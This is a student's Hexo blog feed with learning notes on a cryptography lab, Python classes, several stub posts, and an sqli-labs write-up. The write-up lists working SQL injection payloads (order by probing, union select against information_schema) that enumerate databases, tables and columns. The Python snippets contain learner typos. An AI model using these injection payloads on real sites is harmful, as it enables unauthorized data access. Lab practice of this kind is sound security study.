<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Enhenng的博客</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-11-18T10:37:47.273Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>enhenng</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="http://example.com/2023/11/20/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C/"/>
    <id>http://example.com/2023/11/20/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C/</id>
    <published>2023-11-20T13:57:12.835Z</published>
    <updated>2023-11-18T10:37:47.273Z</updated>
    
    <content type="html"><![CDATA[<h1 id="密码学实验一"><a href="#密码学实验一" class="headerlink" title="密码学实验一"></a>密码学实验一</h1><h3 id="1-题目"><a href="#1-题目" class="headerlink" title="1 题目"></a>1 题目</h3><p>1. Coursera Dan Boneh Week 1 Program Assignment</p><p>Many Time Pad</p><p>2. PA1 option</p><p>Write a program that allows you to “crack” ciphertexts generated using a Vigenere-like cipher, where byte-wise XOR is used instead of addition modulo 26.</p><p>3. <a href="http://www.cryptopals.com/sets/1">http://www.cryptopals.com/sets/1</a></p><p>(1) Convert hex to base64</p><p>(2) Fixed XOR</p><p>(3) Single-byte XOR cipher</p><p>(4) Detect single-character XOR</p><p>(5) Implement repeating-key XOR</p><p>(6) Break repeating-key XOR</p><p>4. MTC3 Cracking SHA1-Hashed Passwords</p><p><a href="https://www.mysterytwisterc3.org/en/challenges/level-2/cracking-sha1-hashed-passwords">https://www.mysterytwisterc3.org/en/challenges/level-2/cracking-sha1-hashed-passwords</a></p><h3 id="2-题目描述"><a href="#2-题目描述" class="headerlink" title="2 题目描述"></a>2 题目描述</h3><h5 id="2-1-Coursera-Dan-Boneh-Week-1-Program-Assignment"><a href="#2-1-Coursera-Dan-Boneh-Week-1-Program-Assignment" class="headerlink" title="2.1 Coursera Dan Boneh Week 1 Program Assignment"></a>2.1 Coursera Dan Boneh Week 1 Program Assignment</h5><h6 id="2-1-1背景"><a href="#2-1-1背景" class="headerlink" title="2.1.1背景"></a>2.1.1背景</h6><p><img src="https://img-blog.csdnimg.cn/20191020012359251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMDI2MjE5,size_16,color_FFFFFF,t_70" alt="题目"></p><p><strong>ciphertext 1</strong></p><p><code>315c4eeaa8b5f8aaf9174145bf43e1784b8fa00dc71d885a804e5ee9fa40b16349c146fb778cdf2d3aff021dfff5b403b510d0d0455468aeb98622b137dae857553ccd8883a7bc37520e06e515d22c954eba5025b8cc57ee59418ce7dc6bc41556bdb36bbca3e8774301fbcaa3b83b220809560987815f65286764703de0f3d524400a19b159610b11ef3e</code></p><p><strong>ciphertext 2</strong></p><p><code>234c02ecbbfbafa3ed18510abd11fa724fcda2018a1a8342cf064bbde548b12b07df44ba7191d9606ef4081ffde5ad46a5069d9f7f543bedb9c861bf29c7e205132eda9382b0bc2c5c4b45f919cf3a9f1cb74151f6d551f4480c82b2cb24cc5b028aa76eb7b4ab24171ab3cdadb8356f</code></p><p><strong>ciphertext 3</strong></p><p><code>32510ba9a7b2bba9b8005d43a304b5714cc0bb0c8a34884dd91304b8ad40b62b07df44ba6e9d8a2368e51d04e0e7b207b70b9b8261112bacb6c866a232dfe257527dc29398f5f3251a0d47e503c66e935de81230b59b7afb5f41afa8d661cb</code></p><p><strong>ciphertext 4</strong></p><p><code>32510ba9aab2a8a4fd06414fb517b5605cc0aa0dc91a8908c2064ba8ad5ea06a029056f47a8ad3306ef5021eafe1ac01a81197847a5c68a1b78769a37bc8f4575432c198ccb4ef63590256e305cd3a9544ee4160ead45aef520489e7da7d835402bca670bda8eb775200b8dabbba246b130f040d8ec6447e2c767f3d30ed81ea2e4c1404e1315a1010e7229be6636aaa</code></p><p><strong>ciphertext 5</strong></p><p><code>3f561ba9adb4b6ebec54424ba317b564418fac0dd35f8c08d31a1fe9e24fe56808c213f17c81d9607cee021dafe1e001b21ade877a5e68bea88d61b93ac5ee0d562e8e9582f5ef375f0a4ae20ed86e935de81230b59b73fb4302cd95d770c65b40aaa065f2a5e33a5a0bb5dcaba43722130f042f8ec85b7c2070</code></p><p><code>32510bfbacfbb9befd54415da243e1695ecabd58c519cd4bd2061bbde24eb76a19d84aba34d8de287be84d07e7e9a30ee714979c7e1123a8bd9822a33ecaf512472e8e8f8db3f9635c1949e640c621854eba0d79eccf52ff111284b4cc61d11902aebc66f2b2e436434eacc0aba938220b084800c2ca4e693522643573b2c4ce35050b0cf774201f0fe52ac9f26d71b6cf61a711cc229f77ace7aa88a2f19983122b11be87a59c355d25f8e4</code></p><p>….</p><p>利用使用相同密钥的十一个密文解出最后一个密文的明文，从而证明多次使用同一个密钥加密是不安全的</p><h6 id="2-1-2-过程："><a href="#2-1-2-过程：" class="headerlink" title="2.1.2 过程："></a>2.1.2 过程：</h6><p>不难知道该道题也是证明一次一密安全性的关键</p><p><a href="https://www.ruanx.net/many-time-pad/">Many-Time-Pad 攻击</a>（整道题都在利用空格）</p><p>思路：</p><ol><li><p>将所有字符串之间异或，并记录字母的频率<br>出现的问题：</p><ul><li><p>异或时默认高位补零，而显然我们想要的不是高位补零，而是高位齐平，低位去掉——&gt;解决方案：找出最短的长度，去低位后异或</p></li><li><p>我怎么取分割字符呢？即一个字符有几位表示？</p></li></ul></li><li><p>判断是否位空格和可能的值</p></li><li><p>设置相关的阈值，解出结果</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;密码学实验一&quot;&gt;&lt;a href=&quot;#密码学实验一&quot; class=&quot;headerlink&quot; title=&quot;密码学实验一&quot;&gt;&lt;/a&gt;密码学实验一&lt;/h1&gt;&lt;h3 id=&quot;1-题目&quot;&gt;&lt;a href=&quot;#1-题目&quot; class=&quot;headerlink&quot; title=&quot;1</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>python学习笔记</title>
    <link href="http://example.com/2022/12/24/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20/"/>
    <id>http://example.com/2022/12/24/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20/</id>
    <published>2022-12-24T12:42:09.000Z</published>
    <updated>2022-12-25T04:38:45.891Z</updated>
    
    <content type="html"><![CDATA[<h1 id="编程的两大思想（我还是不能明白）"><a href="#编程的两大思想（我还是不能明白）" class="headerlink" title="编程的两大思想（我还是不能明白）"></a>编程的两大思想（我还是不能明白）</h1><p>1.面向过程：事物比较简单，可以用线性的思维去解决<br>2.面向对象：事物比较复杂，使用简单的线性思维无法解决</p><h2 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h2><h3 id="类："><a href="#类：" class="headerlink" title="类："></a>类：</h3><p>数据类型：不同的数据类型属于不同的类<br>对象：9,100等实体的例子<br><strong>类的创建：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>: <span class="comment">#Student是类名，可以由一个或多个单词组成，首字母大写，其余小写</span></span><br><span class="line"> <span class="keyword">pass</span>  <span class="comment">#表示先占一个位置</span></span><br></pre></td></tr></table></figure><blockquote><p>python中self的使用：<br> 在开始创建时，把一些必须要绑定的属性填进去，例如name,age等等<br> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>（Object):</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">slef,name,age</span>)</span><br><span class="line">   self.name=name</span><br><span class="line">   self.age=age</span><br></pre></td></tr></table></figure><br>__init__方法的第一参数永远是self,表示创建的类实例本身（所以在创建实例时，就不能传入空的参数，必须传入与__init__匹配的参数。<br>和普通的函数相比，类中定义函数的第一参数永远是self,并且<strong>调用时，不用传递该参数</strong><br> <strong>类的组成：</strong></p></blockquote><ul><li>类属性</li><li>实例方法</li><li>静态方法</li><li>类方法</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    native_place=<span class="string">&#x27;吉林&#x27;</span>  <span class="comment">#类属性（直接写在类里的变量）</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age</span>):  <span class="comment">#name,age是实例属性</span></span><br><span class="line">        self.name=name</span><br><span class="line">        self.age=age</span><br><span class="line">    <span class="comment">#实例方法（在类之外定义的是函数，内部定义的是实例方法）</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">info</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&#x27;我的名字叫：&#x27;</span>,self.name,<span class="string">&#x27;年龄是：&#x27;</span>，self.age)</span><br><span class="line">    <span class="comment">#静态方法</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sm</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;静态方法&#x27;</span>)</span><br><span class="line">    <span class="comment">#类方法</span></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cm</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;静态方法&#x27;</span>)</span><br><span class="line">```    </span><br><span class="line"><span class="comment">### 对象 </span></span><br><span class="line">```python</span><br><span class="line"><span class="comment">#创建Student类中的对象</span></span><br><span class="line">stu1=Student(<span class="string">&#x27;张三&#x27;</span>，<span class="number">20</span>)</span><br><span class="line">stu1.info()  <span class="comment">#这个就是调用info函数   或者也可以是Student.info(stu1)</span></span><br></pre></td></tr></table></figure><h2 id="关于类属性，静态方法与类方法-我还是不明白三种之间到底有什么区别"><a href="#关于类属性，静态方法与类方法-我还是不明白三种之间到底有什么区别" class="headerlink" title="关于类属性，静态方法与类方法(我还是不明白三种之间到底有什么区别)"></a>关于类属性，静态方法与类方法(我还是不明白三种之间到底有什么区别)</h2><p>类属性:@property<br>把类的一些属性封装，类似于数据类型，比如这个类属性为学生等等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>():</span><br><span class="line">    age=<span class="number">18</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">printmessage</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">s1=Student()</span><br><span class="line">s1.printmessage</span><br></pre></td></tr></table></figure><hr><p>静态方法<br>相当于在类里面调用的一个函数 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>():</span><br><span class="line">    age=<span class="number">18</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">printmessage</span>():</span><br><span class="line">        <span class="built_in">print</span>(Student.age)</span><br></pre></td></tr></table></figure><h2 id="动态绑定属性及其方法"><a href="#动态绑定属性及其方法" class="headerlink" title="动态绑定属性及其方法"></a>动态绑定属性及其方法</h2><p>Python是动态语言，在创建对象后可以动态的绑定属性和方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_init_</span>(<span class="params">self,name,age</span>):</span><br><span class="line">        self.name=name</span><br><span class="line">        self.age=age</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">eat</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.name+<span class="string">&#x27;在吃饭&#x27;</span>)</span><br><span class="line"><span class="comment">#动态绑定</span></span><br><span class="line">stu1=Student(<span class="string">&#x27;张三&#x27;</span>,<span class="number">20</span>)</span><br><span class="line">stu2=Student(<span class="string">&#x27;李四&#x27;</span>,<span class="number">18</span>)</span><br><span class="line">stu2.gender=<span class="string">&#x27;男&#x27;</span>  <span class="comment">#则只有stu2才有gender这一属性</span></span><br></pre></td></tr></table></figure><p><img src="D:\enhenng的博客\hexo-blog\source_posts\Python学习方法重写.png" alt="代码演示 "></p><h2 id="面向对象的三大特征"><a href="#面向对象的三大特征" class="headerlink" title="面向对象的三大特征"></a>面向对象的三大特征</h2><p><strong>封装</strong>：提高程序安全性 </p><ul><li>将数据（属性）和行为（方法）包装到类的对象中，在外部直接对对象的调用的方法</li><li>有一些属性不希望在类的外部被使用，在之前加上两个_</li></ul><hr><p><strong>继承：</strong>(继承代码的实现)</p><blockquote><p>在python当中如果一个类没有继承任何类，则默认继承object<br>Python支持多继承<br>定义子类时，必须在其构造的函数中调用父类的构造函数 </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>(<span class="title class_ inherited__">object</span>):     <span class="comment">#这里就是相当于默认继承object，也可以不写</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age</span>):</span><br><span class="line">        self.name=name</span><br><span class="line">        self.age=age</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.name,self.age)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>(<span class="title class_ inherited__">Person</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age,stu_num</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(name,age)   <span class="comment">#这里就是调用父类的init方式</span></span><br><span class="line">        self.stu_num=stu_num</span><br></pre></td></tr></table></figure><p>关于继承中一定会用到的两个函数super(). __init__函数 </p><blockquote><p>super()用来调用父类函数的方法<br><a href="https://blog.csdn.net/a__int__/article/details/104600972">https://blog.csdn.net/a__int__/article/details/104600972</a></p></blockquote><hr><p><strong>方法重写</strong></p><ul><li>如果子类对继承父类的某个属性或者是方法不满意，可以在子类中进行重新编写</li><li>子类重写后的方法中可以通过super().xxx()调用父类中被重写的方法<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>(<span class="title class_ inherited__">object</span>):     <span class="comment">#这里就是相当于默认继承object，也可以不写</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age</span>):</span><br><span class="line">        self.name=name</span><br><span class="line">        self.age=age</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.name,self.age)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>(<span class="title class_ inherited__">Person</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age,stu_num</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(name,age)   <span class="comment">#这里就是调用父类的init方式</span></span><br><span class="line">        self.stu_num=stu_num</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().info()  <span class="comment">#注意这里不需要加上self</span></span><br><span class="line">        <span class="built_in">print</span>(self.stu_num)</span><br></pre></td></tr></table></figure></li></ul><h2 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h2><p>魔法方法：_ _xx _ <em>()的函数叫做魔法方法<br>魔法函数 :</em> _xx _ _()开始和结束的函数叫做魔法函数（允许在类中自定义函数，并且绑定到类的方法</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;编程的两大思想（我还是不能明白）&quot;&gt;&lt;a href=&quot;#编程的两大思想（我还是不能明白）&quot; class=&quot;headerlink&quot; title=&quot;编程的两大思想（我还是不能明白）&quot;&gt;&lt;/a&gt;编程的两大思想（我还是不能明白）&lt;/h1&gt;&lt;p&gt;1.面向过程：事物比较简单，</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2022/12/16/PHP%E8%AF%AD%E8%A8%80/"/>
    <id>http://example.com/2022/12/16/PHP%E8%AF%AD%E8%A8%80/</id>
    <published>2022-12-16T02:42:43.494Z</published>
    <updated>2022-12-16T02:42:43.609Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP语言学习"><a href="#PHP语言学习" class="headerlink" title="PHP语言学习"></a>PHP语言学习</h1><h2 id="PHP中回显和打印"><a href="#PHP中回显和打印" class="headerlink" title="PHP中回显和打印"></a>PHP中回显和打印</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PHP语言学习&quot;&gt;&lt;a href=&quot;#PHP语言学习&quot; class=&quot;headerlink&quot; title=&quot;PHP语言学习&quot;&gt;&lt;/a&gt;PHP语言学习&lt;/h1&gt;&lt;h2 id=&quot;PHP中回显和打印&quot;&gt;&lt;a href=&quot;#PHP中回显和打印&quot; class=&quot;header</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2022/12/11/New%20Document/"/>
    <id>http://example.com/2022/12/11/New%20Document/</id>
    <published>2022-12-11T08:35:43.714Z</published>
    <updated>2022-12-16T07:19:04.546Z</updated>
    
    <content type="html"><![CDATA[<h1 id="层次分析法"><a href="#层次分析法" class="headerlink" title="层次分析法"></a>层次分析法</h1><p>解决评价类问题：  </p><ol><li>我们评价的目标是什么？  </li><li>我们为了达到这个目标有几个可选的方案  </li><li>评价的准则或者说指标是什么？</li></ol><p>指标权重—&gt;判断矩阵<br>判断矩阵可能出现一个错误：及两个之间的变量关系与第三者之间的变量关系不一致（一致矩阵）<br><strong>在使用判断矩阵之前必须对其进行一致性检验</strong><br>一致性判断过程： </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;层次分析法&quot;&gt;&lt;a href=&quot;#层次分析法&quot; class=&quot;headerlink&quot; title=&quot;层次分析法&quot;&gt;&lt;/a&gt;层次分析法&lt;/h1&gt;&lt;p&gt;解决评价类问题：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;我们评价的目标是什么？  &lt;/li&gt;
&lt;li&gt;我们为了达到这个目标有</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>数据结构与算法分析</title>
    <link href="http://example.com/2022/11/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%A2%84%E7%AE%97%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2022/11/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%A2%84%E7%AE%97%E5%88%86%E6%9E%90/</id>
    <published>2022-11-18T02:32:47.000Z</published>
    <updated>2022-11-19T00:33:03.451Z</updated>
    
    <content type="html"><![CDATA[<p>虽然我很不想学习算法相关的知识，但我相信这块应该是有用的，还是努力学一下吧，万一我很喜欢呢~~~~</p><h1 id="树"><a href="#树" class="headerlink" title="树"></a>树</h1><p>关于树以及二叉树的基本的定义不想写了，直接从二叉树的存储开始吧  </p><h2 id="二叉树的存储方式"><a href="#二叉树的存储方式" class="headerlink" title="二叉树的存储方式"></a>二叉树的存储方式</h2><p><strong>线性存储</strong><br>将二叉树赋予序号1,2,3…并将其按照顺序依次存储于数组之中—-&gt;这样会导致非完全二叉树的存储产生浪费——&gt;链式存储<br><strong>链式存储</strong><br>与线性表等完全类似<br>typedef struct Node{<br>     datatype data;<br>     struct Node *Ichild;<br>     struct Node *Rchild;<br>}Bigtree;<br>(当然，如果你愿意，大可以再加上一个parent指针，指向其双亲结点）</p><h2 id="二叉树的遍历和线索化"><a href="#二叉树的遍历和线索化" class="headerlink" title="二叉树的遍历和线索化"></a>二叉树的遍历和线索化</h2><p><strong>二叉树的遍历</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;虽然我很不想学习算法相关的知识，但我相信这块应该是有用的，还是努力学一下吧，万一我很喜欢呢~~~~&lt;/p&gt;
&lt;h1 id=&quot;树&quot;&gt;&lt;a href=&quot;#树&quot; class=&quot;headerlink&quot; title=&quot;树&quot;&gt;&lt;/a&gt;树&lt;/h1&gt;&lt;p&gt;关于树以及二叉树的基本的定义不想写</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>enhenng-first-blog----sql注入(持续更新）</title>
    <link href="http://example.com/2022/11/09/enhenng-first-blog-sql%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2022/11/09/enhenng-first-blog-sql%E6%B3%A8%E5%85%A5/</id>
    <published>2022-11-09T08:51:38.000Z</published>
    <updated>2022-11-13T10:18:43.973Z</updated>
    
    <content type="html"><![CDATA[<p>Hello，我是enhenng,在历经了长达三周的删删改改重建之后，我的blog终于搭建成功啦。</p><p>本文目标：学习sql注入，掌握基本的注入知识<br>基础知识：</p><h1 id="一：sql注入的基础知识："><a href="#一：sql注入的基础知识：" class="headerlink" title="一：sql注入的基础知识："></a>一：sql注入的基础知识：</h1><h2 id="sql的类型"><a href="#sql的类型" class="headerlink" title="sql的类型"></a>sql的类型</h2><ol><li>get型注入：直接在URL中进行sql注入（例如第一题）</li></ol><h2 id="需要使用要的一些函数"><a href="#需要使用要的一些函数" class="headerlink" title="需要使用要的一些函数"></a>需要使用要的一些函数</h2><h1 id="二：sqli-labs闯关"><a href="#二：sqli-labs闯关" class="headerlink" title="二：sqli-labs闯关"></a>二：sqli-labs闯关</h1><p><strong>第一关：基于错误的get型注入（字符型）</strong>（嗯…啥是基于错误？）<br>首先判断注入类型—–&gt;字符型or数字型<br>如何判断注入类型<a href="https://www.jianshu.com/p/5edd7a58a69e" title="参考文章">（参考文章）</a>  （这个很重要）<br>按照文章所示，尝试一下，发现在输入?id&#x3D;1’ and ‘1’&#x3D;’2’–+（这道题如果不加上–+，在回显时会出现报错）（想插一个图片来着，没找到合适的方法，算了）没有回显，是字符型注入。<br>尝试获取列数（在后面的union中需要保证前后队列书相同）</p><blockquote><p>?id&#x3D;1’ order by 3–+   —-&gt;回显正常<br>?id&#x3D;1’ order by 4–+   —-&gt;unkown column ‘4’ in ‘order clause’    </p></blockquote><p>即共有3列，下面才是重点<br>在获取敏感信息前要确定什么才是回显的内容  ?id&#x3D;-1’ union select 1,2,3(得到回显的内容）<br><strong>查询数据库信息</strong>  </p><blockquote><p>union select 1,database(),version<br>union select 1,1,SCHEMA_NAME from information_schema.SCHEMATA（暴露数据库名称）（在这之前需要了解一下数据库的结构）&#x2F;&#x2F;这个命令存在着一个问题<br>，只暴露所找的第一个表名称）<br>解决：union select 1,1,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)–+<br>union select 1,1,TABLE_NAME（表名）,TABLE_SCHEMA（表所在数据库）from information_schema.TABLES（暴露数据库中表的名称）  &#x2F;&#x2F;这个命令存在着一个问题<br>，只暴露所找的第一个表名称）<br>union select 1,1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables *where table_schema&#x3D;’mysql’*)–+(MYSQL查询不区分大小写，但其库名表名等是严格区分大小写的）<br>union select 1,1,(select group_concat(column_name) from information_schema.columns where table_name &#x3D; “CHARACTER_SETS”)–+  </p></blockquote><p>这里的命令可以根据所想要查找的内容任意改变。  </p><p><strong>第二关（数字型）</strong><br>与第一关相同，首先判断sql注入的类型为数字型<br>按照第一关的步骤，依次获得数据库的名称，数据库中表的名称，列的名称等等  </p><p><strong>第三关</strong>（这一关与前两关的区别在于需要根据回显错误的内容猜测输入与原句的关系）<br>尝试猜测过程：  </p><ol><li>输入?id&#x3D;1 回显正常  </li><li>输入?id&#x3D;1’ 回显错误   You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’) LIMIT 0,1’ at line 1(即’’1’’)LIMIT 0,1’为url真正输入的)  </li><li>易看出应该是需要输入’)  </li><li>尝试输入?id&#x3D;1’)–+回显正常，则得出需要输入的东西</li></ol><p>但是这块还有一点我没能搞明白，为什么一定要按照?id&#x3D;1’) order by 1–+输入，而不能按照?id&#x3D;1’ order by 1)–+输入<br>之后，按照第一题依次得到即可以</p><p><strong>第四关</strong>(什么鬼，为什么我的第四关不报错）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Hello，我是enhenng,在历经了长达三周的删删改改重建之后，我的blog终于搭建成功啦。&lt;/p&gt;
&lt;p&gt;本文目标：学习sql注入，掌握基本的注入知识&lt;br&gt;基础知识：&lt;/p&gt;
&lt;h1 id=&quot;一：sql注入的基础知识：&quot;&gt;&lt;a href=&quot;#一：sql注入的基础知识</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2022/11/09/hello-world/"/>
    <id>http://example.com/2022/11/09/hello-world/</id>
    <published>2022-11-09T02:39:26.408Z</published>
    <updated>2022-11-09T02:39:26.408Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
